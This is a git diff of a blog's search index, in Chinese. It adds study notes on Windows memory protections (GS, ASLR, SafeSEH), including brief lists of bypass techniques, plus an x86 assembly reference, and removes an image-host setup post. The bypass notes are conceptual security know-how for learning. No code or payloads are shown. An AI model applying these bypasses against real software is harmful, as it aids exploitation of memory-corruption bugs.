+<li>结构成员当中如果有缓冲区时，这个缓冲区将位于struct或class声明的固定位置</li>
+</ul>
+<p><strong>绕过</strong>：</p>
+<ul>
+<li>利用异常处理器绕过cookie检查</li>
+<li>替换栈和.data节中的cookie来绕过</li>
+<li>覆盖父函数的栈数据来绕过GS检查</li>
+</ul>
+<h4 id="地址空间随机分配ASLR"><a href="#地址空间随机分配ASLR" class="headerlink" title="地址空间随机分配ASLR"></a>地址空间随机分配ASLR</h4><p>进行随机化的对象有：映像（可执行文件和DLL的加载地址）、栈（每个线程起始栈的地址）、堆（改变已分配堆的基地址）</p>
+<p>实现方式：VS编辑器—DYNAMICBASE、映像加载基址随机化</p>
+<p><strong>缺陷及绕过</strong>：一个被多个进程同时使用的DLL，由于一直有人使用，因此其地址是固定的</p>
+<ul>
+<li>返回地址部分覆盖：随机化一般发生在地址的高16位，找到对应高地址空间下可以利用的跳转指令进行覆盖</li>
+<li>大多程序在编译时没有使用随机化，因此这些程序中没有启用ASLR的模块的相关跳转指令便可以作为跳板，用来引导至恶意代码</li>
+</ul>
+<h4 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h4><p>SafeSHE用来检测和保护和防止堆栈中的SEH函数指针被覆盖的技术</p>
+<p>原理：编译器在链接生成二进制映像文件时，会将所有合法的异常处理函数的地址解析出来制作成一张安全的SEH表，并保存在程序映像文件中的数据块里，每当这些函数被调用时，就会与SEH表中的地址进行匹配（如果映像文件不支持，则该表的地址为0）</p>
+<p>加载过程：程序影响加载到内存时，系统定位该表，并使用Shareuser内存中的一个随机数进行加密，将加密后的表地址、映像文件开始地址、长度、合法SEH函数数目作为一条记录放入到ntdll加载模块数据内存中</p>
+<p>异常处理过程：首先检查该异常处理程序是否在栈中，不在的话则不执行；并再次被检查是否位于映像文件的地址空间；在的话，则执行，否则：</p>
+<p>如果该地址位于不可执行页上，则检查DEP开启状态（开了就报错，否则执行）；若位于可执行页上，则判断系统是否允许跳转到加载模块的内存空间外执行，可以则执行否则抛错</p>
+<p><strong>绕过</strong>：必须要使用.Net编译器且开启SafeSEH连接选项</p>
+<ul>
+<li>利用未启用SafeSEH的模块作为跳板</li>
+<li>利用加载模块之外的地址进行绕过（比如堆区一般会直接跳转执行）</li>
+</ul>
+]]></content>
+      <categories>
+        <category>系统安全</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>OS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>x86汇编</title>
+    <url>/2023/08/27/x86%E6%B1%87%E7%BC%96/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：最好从32位ARM或MIPS汇编过来，强烈推荐王爽的《汇编语言》</p>
+<span id="more"></span>
+
+<h3 id="0x00-基础介绍"><a href="#0x00-基础介绍" class="headerlink" title="0x00.基础介绍"></a>0x00.基础介绍</h3><ol>
+<li><p><b>Base</b></p>
+<ul>
+<li><p>在x86架构中，1字&#x3D;2字节，与位数无关；</p>
+</li>
+<li><p>小端存储：高字节放高地址；</p>
+</li>
+<li><p>K(千)-M(兆)-G(吉)-T(太)-P(拍)-E(艾)-Z(泽)-Y(尧)</p>
+</li>
+<li><p>AT&amp;T语法会在常量前加<code>$</code>，而在寄存器前加<code>%</code>，且源操作数放在目的操作数前面，Intel语法不加这些符号，且目的在源前面</p>
+</li>
+<li><p>x86指32位架构&#x3D;IA-32，x86-64指在32位上扩展至64位&#x3D;amd64&#x3D;intel64&#x3D;IA-32E，IA-64即64位架构（但是并不兼容之前的32位）</p>
+</li>
+</ul>
+</li>
+<li><p><b>Build</b>——常量（整数常量&#x2F;整型常量表达式、实数常量、字符常量&#x2F;字符串常量）+ 保留字 + 标识符 + 伪指令 + 指令；指令（一条语句）&#x3D;  (标号) + 指令助记符 + 操作数 + (注释) + (NOP)</p>
+<blockquote>
+<p>NOP占1个字节，用于对齐到4的位数位置，类似作用的还有ALIGN（伪指令）；单行注释用“；”，块注释用“COMMENT 符号……符号”，中间包括的内容全是注释；</p>
+</blockquote>
+</li>
+<li><p><b>Model</b>——32位模式下三个模式：保护模式 + 实地址模式 + 系统管理模式；64位（x86-64）模式下额外包含：兼容模式（不兼容16位实地址模式） + 64位模式；</p>
+<ul>
+<li><p>保护模式（大多）：为兼容8086；32位地址线均可用；支持分页、优先级；所有指令可用，程序被分配的段以外的空间不允许访问。</p>
+<p>其下的虚拟8086模式，以一个任务的形式工作在保护模式下。</p>
+</li>
+<li><p>实地址模式：兼容8086。寻址方式&#x3D;段寄存器×16当作基地址，再加上偏移地址形成最终物理地址（只用了32位中的低20位）。可执行所有指令，且所有指令工作在特权级（优先级0）。由于不能分页管理，所以可以直接操作内存</p>
+</li>
+<li><p>系统管理模式：专门为32位OS提供的模式</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="0x01-指令助记符"><a href="#0x01-指令助记符" class="headerlink" title="0x01.指令助记符"></a>0x01.指令助记符</h3><p>（1）<b>定义类型</b>：</p>
+<ul>
+<li><code>BYTE,WORD,DWORD</code>在前面加S表示有符号整数；<code>FWORD,QWORD,TBYTE</code>,表示48位、64位、80位整数；</li>
+<li><code>REAL4,REAL8,REAL10</code>表示32位、64位80位实数；</li>
+</ul>
+<p>（2）<b>数据传送指令</b>：</p>
+<ul>
+<li><code>MOV,MOVZX,MOVSX</code>，mov用于相同位数传送，MOVZX全零扩展后传送，MOVSX符号扩展后传送；</li>
+<li><code>LAHF,SAHF</code>，将EFLAGS低字节内容load到AH中，或将AH内容save到EFLAGS中；</li>
+<li><code>XCHG</code>交换两个操作数内容；</li>
+</ul>
+<p>（3）<b>运算指令</b>：</p>
+<ul>
+<li><code>INC,DEC,ADD,SUB,ADC,SBB</code>，功能依次：+1，-1，加法，减法，带进位(CF)加法，带借位减法；</li>
+<li><code>OFFSET,TYPE,LENGTHOF,SIZEOF,PTR，LABEL</code>，offset+标识符&#x3D;标识符偏移地址、返回数据类型字节数、数组长度、数组字节数&#x3D;type*lengthof、更改预设标识符类型、预分配待填充（预先时无分配地址）；</li>
+<li><code>TYPEDEF</code>,指定数据类型（换名）；</li>
+<li><code>MUL,IMUL(有符号)</code>，单操作数，mul后跟乘数，另一个乘数根据操作数位数决定，8位（AL）积（AX），16位（AX）积（DX：AX），32位（EAX）积（EDX：EAX），64位（RAX）积（RDX：RAX）；</li>
+<li><code>DIV,IDIV</code>,被除数（AX、…….）默认➗除数（8、16、32、64）&#x3D;商（AL、AX、EAX、DAX）+余数（AH、DX、EDX、RDX）；在做有符号除法前，需要被除数扩展符号位，<code>CBW,CWD,CDQ</code>,字节转字，字转双字，双字转四字，AL向AH扩，AX向DX扩，EAX向EDX扩；</li>
+</ul>
+<p>（4）<b>位操作指令</b>：</p>
+<ul>
+<li><code>NEG,AND,OR,XOR,NOT</code>，转补码（取相反数）、与（字符AND11011111转大写）、或（字符OR00100000转小写）、异或、非；</li>
+<li><code>SHL(SHR),SAL,ROL,RCL</code>,逻辑左移即填0，算数左移低位填0（右移时填符号位），注意挤出来的那位需要放在EFLAGS中CF位，循环左移（带着CF），带进位循环左移（相比ROL差一位，会将CF的值加入），L改为R变成向右；</li>
+<li><code>SHLD/SHRD</code>,双精度左移&#x2F;右移，<code>SHLD des sou count  </code>将des左移count位，低位插入sou高位</li>
+</ul>
+<p>（5）<b>堆栈操作指令</b>：</p>
+<ul>
+<li><code>PUSH,PUSHFD,PUSHAD,PUSHA</code>,入栈，EFLAGS入栈，按照EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI顺序放栈，pusha是pushad的16位版本；pop同理，但出栈顺序相反；</li>
+<li><code>CALL RET</code>,将call的下一条指令压入栈，并跳转，ret则弹出并跳转；</li>
+</ul>
+<p>（6）<b>跳转指令</b>：</p>
+<ul>
+<li><code>LOOP(LOOPW),LOOPD,LOOPZ(LOOPE),LOOPNZ(LOOPNE),JMP</code>，cx!&#x3D;0跳转、ecx!&#x3D;0跳转、在loop基础上且ZF&#x3D;1跳、在loop基础上且ZF&#x3D;0跳、直接跳；</li>
+<li><code>JC(JNC),JZ(.),JO(.),JS(.),JP(.),JE(JNE),JCXZ(JECXZ,JRAXZ)</code>，括号外是CF&#x3D;1、ZF&#x3D;1、OF&#x3D;1、SF&#x3D;1、PF&#x3D;1跳，括号内则是&#x3D;0跳，JE：左等于右跳，加N不等则跳，JCXZ则是&#x3D;0（ECX&#x2F;RCX&#x3D;0）跳；</li>
+<li><code>JA,JNA,JAE,JNAE</code>，无符号数 大于 不大于 大于等于 不大于等于 时跳转；无符号数大于（above）小于（below），有符号数大于（greater）小于（less）； </li>
+<li><code>beginWhile......endWhile</code>,while循环</li>
+</ul>
+<p>（7）<b>串串操作指令</b>：</p>
+<ul>
+<li><code>MOVSB(W/D)</code>：将（ESI）指向的值赋给（EDI）指向的地方；</li>
+<li><code>CMPSB(W/D)</code>：比较（ESI）与（EDI）指向的值的大小；</li>
+<li><code>SCASB(W/D),STOSB(W/D),LODS(W/D)</code>：比较；令AL&#x2F;AX&#x2F;EAX投射到（EDI）的位置；装载；</li>
+<li><code>CLD,STD</code>：设置正向（方向标记位&#x3D;0）or反向；</li>
+<li><code>REP,REP(N)Z/E</code>：ECX&gt;0时重复，增加条件ZF&#x3D;1（ZF&#x3D;0）；</li>
+</ul>
+<h3 id="0x02-伪指令"><a href="#0x02-伪指令" class="headerlink" title="0x02.伪指令"></a>0x02.伪指令</h3><ul>
+<li>public&#x2F;private表明该模块是否可以被其他模块调用</li>
+</ul>
+<pre><code>main proc (PUBLIC/PRIVATE) (传入参数...)  ;main过程开始，过程即子函数
+     ...
+main endp  ;结束main过程
+</code></pre>
+<ul>
+<li>若需要调用的模块写在main之后，需要下面的方式做个提前声明</li>
+</ul>
+<pre><code>PROTP target_fx		;提前声明，类似于C的int sum();
+EXTERN target_gx	;引用当前文件之外的模块，注意被引用的需要为public
+ALIGN + 定义类型	;设定对齐方式
+INVOKE 过程名 [入栈参数n...入栈参数1] ;只能在32位模式下，若参数小于32位，则会使用CBW等扩展命令
+ADDR array		;ADDR只能跟在INVOKE后面做入栈参数使用，意思是取地址/传地址 
+</code></pre>
+<ul>
+<li>若需要使用过程，则注意过程帧的使用</li>
+</ul>
+<pre><code>ENTER		;自动补齐相应的寄存器等	  
+...
+LEAVE
+</code></pre>
+<ul>
+<li>结构体</li>
+</ul>
+<pre><code>name struct/union		;定义结构体，与C一样
+    ...			
+name ENDS		;还支持嵌套使用，此时内层不需要该行的name
+</code></pre>
+<h4 id="宏（放在-data段，而不是-code段）"><a href="#宏（放在-data段，而不是-code段）" class="headerlink" title="宏（放在.data段，而不是.code段）"></a>宏（放在.data段，而不是.code段）</h4><pre><code>name MACRO(参数1：REQ，参数2：=&lt; &gt;，参数3)    ;定义时不检查参数类型，只有宏展开时检查,REQ表明是必须要的，:=&lt;无赋值时的初始值&gt;
+    LOCAL string			;LOCAL作用是，在一个宏多次展开时为避免出现多个重复的string，而使用的，将其转换为唯一标识符“??0000”、&quot;??0001&quot;等			
+    ...					
+ENDM		;;该注释在宏展开时不会出现在代码中，上述注释会出现
+
+ECHO ‘xxxxxxxxxx’		;输出字符串xxxxxxxxxx
+</code></pre>
+<ul>
+<li>循环宏</li>
+</ul>
+<pre><code>WHILE(表达式):为真时执行
+REPEAT N:重复N次
+FOR A,&lt;A1,A2...&gt;:让A依次为A1,A2...
+FORC A,&lt;string&gt;:让A依次为&#39;s&#39;,&#39;t&#39;...
+</code></pre>
+<ul>
+<li>条件宏（可与LT小于，GT大于，EQ等于，NE不等于，LE小于等于，GE大于等于，搭配使用）</li>
+</ul>
+<pre><code>IFB/IFNB:空/非空，则允许汇编
+IFIDN/IFDIF a b:参数a和参数b 相等/不相等 则允许（区分大小写）
+IFIDNI/IFDIFI a b:上面类似但不区分大小写
+IFDIF/IFNDIF name:如果name已/未定义 则汇编
+IF,ENDIF,ELSE,ELSEIF:自己看
+EXITM:退出宏，且后面的宏语句都不能展开
+</code></pre>
+<ul>
+<li>特殊运算符</li>
+</ul>
+<pre><code>&#39;&amp;&#39; : 使“CX”通过“&amp;CX”变为CX
+&#39;&lt;&gt;&#39; : 传递宏参数时“a，0，0”为三个参数，“&lt;a,0,0&gt;”为一个参数
+&#39;!&#39; : &lt;xxxx5&gt;2&gt;,第一个‘&gt;’影响判断“&lt;xxxx5!&gt;2&gt;”则将其当做字符串的一部分
+&#39;%&#39; : 传递宏参数时，“%(5+2)”，是可行的，会自动运算，“5+2”不可行
+</code></pre>
+<h3 id="0x03-32位寄存器"><a href="#0x03-32位寄存器" class="headerlink" title="0x03.32位寄存器"></a>0x03.32位寄存器</h3><p>（1）<strong>8个通用寄存器</strong>（64位时前缀R，共16个通用reg）：</p>
+<ul>
+<li><p>EAX（常用于累加）EBX（内存寻址の基址寄存器）ECX（循环计数器）EDX（与除法乘法有关）</p>
+</li>
+<li><p>ESI、EDI（与bx&#x2F;bp搭配使用，遍历数组）ESP（指向栈顶）EBP（指向栈底）</p>
+<blockquote>
+<p>EBP与ESP总是指向堆栈段最上面的栈帧，也叫活动记录，用于向子函数传递参数</p>
+</blockquote>
+</li>
+</ul>
+<p>（2）<strong>6个段寄存器</strong>（指向大致方向）：</p>
+<ul>
+<li><p>CS（代码段寄存器）DS（数据段寄存器，与BX搭配）SS（堆栈段寄存器，与SP、BP搭配）</p>
+</li>
+<li><p>附加段寄存器—ES、FS、GS</p>
+</li>
+</ul>
+<p>（3）<strong>标志寄存器</strong>（EFLAGS）</p>
+<blockquote>
+<p>有32位，在64位模式下，由64位的RFLAGS取代，但是高32位不使用，各位用法不变</p>
+</blockquote>
+<ul>
+<li><p>CF—无符号进位标志位、OF—有符号溢出标志位</p>
+</li>
+<li><p>SF—符号标志位（正&#x3D;0）、ZF—零标志位（结果为0&#x3D;1）</p>
+</li>
+</ul>
+<p>（4）<strong>指令指针寄存器</strong>（EIP&#x2F;RIP）：指向下一条要执行的指令，与CS搭配食用</p>
+<p>（5）<strong>特殊寄存器</strong>：8个64位のMMX寄存器 + 8个128位的XMM寄存器，被用于SIMD（单指令多数据）指令体系中，多用于高级多媒体通信或用于FPU中（用于计算浮点数，现多集成于cpu中）；</p>
+<blockquote>
+<p>在64位模式下&#x3D;8个64位のMMX寄存器 + 16个128位的XMM寄存器 + 8个80位的浮点寄存器</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>系统安全</category>
+      </categories>
+      <tags>
+        <tag>汇编</tag>
+        <tag>x86</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Web安全</title>
     <url>/2023/09/18/Web%E5%AE%89%E5%85%A8/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>主要讲解Web应用相关漏洞</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：主要讲解Web应用相关漏洞原理</p>
 <span id="more"></span>
 
 <h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h3><p>原理：用户输入的数据未经过滤被SQL解释器执行；扫描、注入工具：SqlMap、Pangolin（穿山甲）、Havij、BSQL Hacker、The Mole；使用单双引号或<code>\</code>来检测是否报错；靶场：sqli-labs</p>
@@ -893,1937 +2295,9 @@ evil.dtd如下
       </tags>
   </entry>
   <entry>
-    <title>图床配置</title>
-    <url>/2023/09/28/PicGo%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>摘要：感觉blog有时还是有图片才能说清楚。配置采用ImgTP+PicGo+Typora</p>
-<span id="more"></span>
-
-<h3 id="PicGo-Typora"><a href="#PicGo-Typora" class="headerlink" title="PicGo+Typora"></a>PicGo+Typora</h3><h4 id="安装PicGo"><a href="#安装PicGo" class="headerlink" title="安装PicGo"></a>安装PicGo</h4><p>首先需要保证有安装node.js<span class="exturl" data-url="aHR0cHM6Ly9ub2RlanMuY24vZG93bmxvYWQv">下载 | Node.js 中文网 (nodejs.cn)<i class="fa fa-external-link-alt"></i></span>，且版本&gt;&#x3D;16。官网<span class="exturl" data-url="aHR0cHM6Ly9waWNnby5naXRodWIuaW8vUGljR28tRG9jL3poLw==">PicGo<i class="fa fa-external-link-alt"></i></span></p>
-<p><img src="https://img1.imgtp.com/2023/09/28/DQauhJgK.png" alt="image-20230928114412259"></p>
-<p>进入下载安装界面，最新的测试版版（2.4）的能够在github中找到，其余的都是正式发行版（2.3.1）</p>
-<p>安装正式版的即可，没有多大的区别</p>
-<p>这里以山东大学镜像站为例子，进入其右侧链接</p>
-<p><img src="https://img1.imgtp.com/2023/09/28/rrEcNADX.png" alt="image-20230928114745451"></p>
-<p>之后点击v2.3.1即可下载，安装。具体安装过程不再演示</p>
-<h4 id="配置PicGo"><a href="#配置PicGo" class="headerlink" title="配置PicGo"></a>配置PicGo</h4><p>PicGo的作用仅相当于快速帮助我们将图片上传到图床中，所以我们还需要配置图床。下面是其默认支持的图床</p>
-<p><img src="https://img1.imgtp.com/2023/09/28/jV90Xtvq.png" alt="image-20230928115100677"></p>
-<p>本人选择的是imgtp（穷啊）<span class="exturl" data-url="aHR0cHM6Ly93d3cuaW1ndHAuY29tLw==">ImgTP - 免费公共图床<i class="fa fa-external-link-alt"></i></span></p>
-<p>当然还有其他许多图床以插件的形式支持，具体请见<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BpY0dvL0F3ZXNvbWUtUGljR28=">GitHub - PicGo&#x2F;Awesome-PicGo: A collection of awesome projects using PicGo.<i class="fa fa-external-link-alt"></i></span></p>
-<p><img src="https://img1.imgtp.com/2023/09/28/QASEnLlP.png" alt="image-20230928120129720"></p>
-<p>如果选择的图床并非上述默认支持，可以在PicGo的 “插件设置” 中进行搜索，之后安装。上述网站中的插件大部分可以用这种方式，少部分需要手动安装，这里不过多叙述</p>
-<p><img src="https://img1.imgtp.com/2023/09/28/DiKzrZcX.png" alt="image-20230928130909949"></p>
-<p>在图床注册号帐号之后，在设置里找到Token项，copy一下</p>
-<p><img src="https://img1.imgtp.com/2023/09/28/hdgfMkRs.png" alt="image-20230928115831774"></p>
-<p>之后进入到PicGo中，插件选项，配置uploader-imgtp</p>
-<p><img src="https://img1.imgtp.com/2023/09/28/J84T068l.png" alt="image-20230928120022812"></p>
-<p>按照框子进行输入（该图床插件并不需要Token，但是大多都是必须的）</p>
-<p><img src="https://img1.imgtp.com/2023/09/28/pgMta4TP.png" alt="image-20230928120243184"></p>
-<p>确认之后，记得到PicGO的图床设置中，将你的图床设置为默认图床</p>
-<h4 id="配置Typora"><a href="#配置Typora" class="headerlink" title="配置Typora"></a>配置Typora</h4><p>在Typora中找到 “文件” ——&gt; “偏好设置” ——&gt; “图像”，进行如下配置：</p>
-<p><img src="https://img1.imgtp.com/2023/09/28/yMn2nLmS.png" alt="image-20230928120852234"></p>
-<p>之后点击 “验证图片上传选项”，成功的话会有如下显示</p>
-<p><img src="https://img1.imgtp.com/2023/09/28/PXUrcHIG.png" alt="image-20230928121022365"></p>
-<p>到这里，就配置完成了，每次在Typora中粘贴图像时，都会自动上传到图床中，上传的图片可以在PicGo的相册看到</p>
-<h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><ol>
-<li>端口设置，一般默认就好，配置端口36677（位置在”PicGo设置”——&gt;”设置Server”）</li>
-</ol>
-<img src="https://img1.imgtp.com/2023/09/28/tiTBNHVq.png" alt="image-20230928131205132" style="zoom:80%;" />
-
-<p>​	需要与Typora的端口设置对应，也就是上面验证时的命令：</p>
-<p>​	<code>using http://127.0.0.1:36677/upload</code></p>
-<ol start="2">
-<li>后端Token获取失败，需要在配置时，将”上传模式”更改为<code>Front-End</code></li>
-</ol>
-<p><img src="https://img1.imgtp.com/2023/09/28/q5TwMjjL.png" alt="image-20230928131525676"></p>
-<ol start="3">
-<li>有时显示该图片被阻塞，大概率是墙的问题。就比如SM.MS图床，就需要设置它的备用域名</li>
-</ol>
-<p><img src="https://img1.imgtp.com/2023/09/28/V60z4Ic6.png" alt="image-20230928131830217"></p>
-<p>注意：大多图床都会检测VPN，如果是开着梯子上传的，则会上传失败</p>
-]]></content>
-      <tags>
-        <tag>杂谈</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>x86汇编</title>
-    <url>/2023/08/27/x86%E6%B1%87%E7%BC%96/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最好从32位ARM、MIPS汇编过来</p>
-<span id="more"></span>
-
-<h3 id="0x00-基础介绍"><a href="#0x00-基础介绍" class="headerlink" title="0x00.基础介绍"></a>0x00.基础介绍</h3><ol>
-<li><p><b>Base</b></p>
-<ul>
-<li><p>在x86架构中，1字&#x3D;2字节，与位数无关；</p>
-</li>
-<li><p>小端存储：高字节放高地址；</p>
-</li>
-<li><p>K(千)-M(兆)-G(吉)-T(太)-P(拍)-E(艾)-Z(泽)-Y(尧)</p>
-</li>
-<li><p>AT&amp;T语法会在常量前加<code>$</code>，而在寄存器前加<code>%</code>，且源操作数放在目的操作数前面，Intel语法不加这些符号，且目的在源前面</p>
-</li>
-<li><p>x86指32位架构&#x3D;IA-32，x86-64指在32位上扩展至64位&#x3D;amd64&#x3D;intel64&#x3D;IA-32E，IA-64即64位架构（但是并不兼容之前的32位）</p>
-</li>
-</ul>
-</li>
-<li><p><b>Build</b>——常量（整数常量&#x2F;整型常量表达式、实数常量、字符常量&#x2F;字符串常量）+ 保留字 + 标识符 + 伪指令 + 指令；指令（一条语句）&#x3D;  (标号) + 指令助记符 + 操作数 + (注释) + (NOP)</p>
-<blockquote>
-<p>NOP占1个字节，用于对齐到4的位数位置，类似作用的还有ALIGN（伪指令）；单行注释用“；”，块注释用“COMMENT 符号……符号”，中间包括的内容全是注释；</p>
-</blockquote>
-</li>
-<li><p><b>Model</b>——32位模式下三个模式：保护模式 + 实地址模式 + 系统管理模式；64位（x86-64）模式下额外包含：兼容模式（不兼容16位实地址模式） + 64位模式；</p>
-<ul>
-<li><p>保护模式（大多）：为兼容8086；32位地址线均可用；支持分页、优先级；所有指令可用，程序被分配的段以外的空间不允许访问。</p>
-<p>其下的虚拟8086模式，以一个任务的形式工作在保护模式下。</p>
-</li>
-<li><p>实地址模式：兼容8086。寻址方式&#x3D;段寄存器×16当作基地址，再加上偏移地址形成最终物理地址（只用了32位中的低20位）。可执行所有指令，且所有指令工作在特权级（优先级0）。由于不能分页管理，所以可以直接操作内存</p>
-</li>
-<li><p>系统管理模式：专门为32位OS提供的模式</p>
-</li>
-</ul>
-</li>
-</ol>
-<h3 id="0x01-指令助记符"><a href="#0x01-指令助记符" class="headerlink" title="0x01.指令助记符"></a>0x01.指令助记符</h3><p>（1）<b>定义类型</b>：</p>
-<ul>
-<li><code>BYTE,WORD,DWORD</code>在前面加S表示有符号整数；<code>FWORD,QWORD,TBYTE</code>,表示48位、64位、80位整数；</li>
-<li><code>REAL4,REAL8,REAL10</code>表示32位、64位80位实数；</li>
-</ul>
-<p>（2）<b>数据传送指令</b>：</p>
-<ul>
-<li><code>MOV,MOVZX,MOVSX</code>，mov用于相同位数传送，MOVZX全零扩展后传送，MOVSX符号扩展后传送；</li>
-<li><code>LAHF,SAHF</code>，将EFLAGS低字节内容load到AH中，或将AH内容save到EFLAGS中；</li>
-<li><code>XCHG</code>交换两个操作数内容；</li>
-</ul>
-<p>（3）<b>运算指令</b>：</p>
-<ul>
-<li><code>INC,DEC,ADD,SUB,ADC,SBB</code>，功能依次：+1，-1，加法，减法，带进位(CF)加法，带借位减法；</li>
-<li><code>OFFSET,TYPE,LENGTHOF,SIZEOF,PTR，LABEL</code>，offset+标识符&#x3D;标识符偏移地址、返回数据类型字节数、数组长度、数组字节数&#x3D;type*lengthof、更改预设标识符类型、预分配待填充（预先时无分配地址）；</li>
-<li><code>TYPEDEF</code>,指定数据类型（换名）；</li>
-<li><code>MUL,IMUL(有符号)</code>，单操作数，mul后跟乘数，另一个乘数根据操作数位数决定，8位（AL）积（AX），16位（AX）积（DX：AX），32位（EAX）积（EDX：EAX），64位（RAX）积（RDX：RAX）；</li>
-<li><code>DIV,IDIV</code>,被除数（AX、…….）默认➗除数（8、16、32、64）&#x3D;商（AL、AX、EAX、DAX）+余数（AH、DX、EDX、RDX）；在做有符号除法前，需要被除数扩展符号位，<code>CBW,CWD,CDQ</code>,字节转字，字转双字，双字转四字，AL向AH扩，AX向DX扩，EAX向EDX扩；</li>
-</ul>
-<p>（4）<b>位操作指令</b>：</p>
-<ul>
-<li><code>NEG,AND,OR,XOR,NOT</code>，转补码（取相反数）、与（字符AND11011111转大写）、或（字符OR00100000转小写）、异或、非；</li>
-<li><code>SHL(SHR),SAL,ROL,RCL</code>,逻辑左移即填0，算数左移低位填0（右移时填符号位），注意挤出来的那位需要放在EFLAGS中CF位，循环左移（带着CF），带进位循环左移（相比ROL差一位，会将CF的值加入），L改为R变成向右；</li>
-<li><code>SHLD/SHRD</code>,双精度左移&#x2F;右移，<code>SHLD des sou count  </code>将des左移count位，低位插入sou高位</li>
-</ul>
-<p>（5）<b>堆栈操作指令</b>：</p>
-<ul>
-<li><code>PUSH,PUSHFD,PUSHAD,PUSHA</code>,入栈，EFLAGS入栈，按照EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI顺序放栈，pusha是pushad的16位版本；pop同理，但出栈顺序相反；</li>
-<li><code>CALL RET</code>,将call的下一条指令压入栈，并跳转，ret则弹出并跳转；</li>
-</ul>
-<p>（6）<b>跳转指令</b>：</p>
-<ul>
-<li><code>LOOP(LOOPW),LOOPD,LOOPZ(LOOPE),LOOPNZ(LOOPNE),JMP</code>，cx!&#x3D;0跳转、ecx!&#x3D;0跳转、在loop基础上且ZF&#x3D;1跳、在loop基础上且ZF&#x3D;0跳、直接跳；</li>
-<li><code>JC(JNC),JZ(.),JO(.),JS(.),JP(.),JE(JNE),JCXZ(JECXZ,JRAXZ)</code>，括号外是CF&#x3D;1、ZF&#x3D;1、OF&#x3D;1、SF&#x3D;1、PF&#x3D;1跳，括号内则是&#x3D;0跳，JE：左等于右跳，加N不等则跳，JCXZ则是&#x3D;0（ECX&#x2F;RCX&#x3D;0）跳；</li>
-<li><code>JA,JNA,JAE,JNAE</code>，无符号数 大于 不大于 大于等于 不大于等于 时跳转；无符号数大于（above）小于（below），有符号数大于（greater）小于（less）； </li>
-<li><code>beginWhile......endWhile</code>,while循环</li>
-</ul>
-<p>（7）<b>串串操作指令</b>：</p>
-<ul>
-<li><code>MOVSB(W/D)</code>：将（ESI）指向的值赋给（EDI）指向的地方；</li>
-<li><code>CMPSB(W/D)</code>：比较（ESI）与（EDI）指向的值的大小；</li>
-<li><code>SCASB(W/D),STOSB(W/D),LODS(W/D)</code>：比较；令AL&#x2F;AX&#x2F;EAX投射到（EDI）的位置；装载；</li>
-<li><code>CLD,STD</code>：设置正向（方向标记位&#x3D;0）or反向；</li>
-<li><code>REP,REP(N)Z/E</code>：ECX&gt;0时重复，增加条件ZF&#x3D;1（ZF&#x3D;0）；</li>
-</ul>
-<h3 id="0x02-伪指令"><a href="#0x02-伪指令" class="headerlink" title="0x02.伪指令"></a>0x02.伪指令</h3><ul>
-<li>public&#x2F;private表明该模块是否可以被其他模块调用</li>
-</ul>
-<pre><code>main proc (PUBLIC/PRIVATE) (传入参数...)  ;main过程开始，过程即子函数
-     ...
-main endp  ;结束main过程
-</code></pre>
-<ul>
-<li>若需要调用的模块写在main之后，需要下面的方式做个提前声明</li>
-</ul>
-<pre><code>PROTP target_fx		;提前声明，类似于C的int sum();
-EXTERN target_gx	;引用当前文件之外的模块，注意被引用的需要为public
-ALIGN + 定义类型	;设定对齐方式
-INVOKE 过程名 [入栈参数n...入栈参数1] ;只能在32位模式下，若参数小于32位，则会使用CBW等扩展命令
-ADDR array		;ADDR只能跟在INVOKE后面做入栈参数使用，意思是取地址/传地址 
-</code></pre>
-<ul>
-<li>若需要使用过程，则注意过程帧的使用</li>
-</ul>
-<pre><code>ENTER		;自动补齐相应的寄存器等	  
-...
-LEAVE
-</code></pre>
-<ul>
-<li>结构体</li>
-</ul>
-<pre><code>name struct/union		;定义结构体，与C一样
-    ...			
-name ENDS		;还支持嵌套使用，此时内层不需要该行的name
-</code></pre>
-<h4 id="宏（放在-data段，而不是-code段）"><a href="#宏（放在-data段，而不是-code段）" class="headerlink" title="宏（放在.data段，而不是.code段）"></a>宏（放在.data段，而不是.code段）</h4><pre><code>name MACRO(参数1：REQ，参数2：=&lt; &gt;，参数3)    ;定义时不检查参数类型，只有宏展开时检查,REQ表明是必须要的，:=&lt;无赋值时的初始值&gt;
-    LOCAL string			;LOCAL作用是，在一个宏多次展开时为避免出现多个重复的string，而使用的，将其转换为唯一标识符“??0000”、&quot;??0001&quot;等			
-    ...					
-ENDM		;;该注释在宏展开时不会出现在代码中，上述注释会出现
-
